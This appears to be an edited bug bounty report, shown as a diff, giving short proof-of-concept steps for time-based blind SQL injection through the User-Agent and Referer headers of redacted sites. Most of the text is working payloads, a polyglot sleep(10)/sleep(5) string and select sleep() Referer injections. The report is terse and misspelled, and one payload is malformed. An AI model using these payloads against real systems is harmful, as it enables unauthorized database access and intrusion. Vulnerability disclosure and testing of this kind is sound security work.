@@ -2,3 +2,11 @@ useragnet sql :1- open https://███/ and intercept data
 2- put this payload in user agent parameter if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0))OR"*/  like poc 1
 and as you see in poc 1 make sleep order for 10 sec
 3- and if we change order to make sleep for 5 sec if(now()=sysdate(),sleep(5),0)/*'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0))OR"*/ like poc 2
+
+
+
+refer header :
+Proof of concept :
+1- go to https://██████████/████████ and capture Request
+2- put this payload in Referer '+(selectfrom(select(sleep(66)))a
+payload:- Referer: https://████████/'+(select*from(select(sleep(15)))a)+'
